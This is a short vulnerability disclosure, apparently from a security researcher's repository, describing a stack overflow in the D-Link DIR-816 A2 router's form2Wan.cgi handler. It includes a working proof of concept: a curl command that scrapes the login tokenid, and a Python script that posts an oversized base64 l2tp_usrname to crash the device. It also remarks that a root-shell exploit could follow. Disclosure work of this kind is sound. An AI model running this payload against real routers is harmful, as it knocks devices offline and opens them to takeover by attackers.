# D-link DIR-816 A2_v1.10CNB04.img Stack overflow vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/form2Wan_cgi/img/vuln1.png)

Vulnerability occurs in /goform/form2Wan.cgi, When wantype is 3, l2tp_usrname will be decrypted by base64, and the result will be stored in v94, which does not check the size of l2tp_usrname, resulting in stack overflow

## Poc

The first thing you need to do is to get the tokenid
```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc

```python
import requests
import base64

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = 'xxxx'

url = 'http://192.168.0.1/goform/form2Wan.cgi'

payload = base64.b64encode(b'a' * 10000)

data = {
    'tokenid' : tokenid,
    'wantype' : '3',
    'l2tp_usrname' : payload,
    'l2tp_psword' : payload
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
```

You can see the router crash, and finally you can write an exp to get a root shell
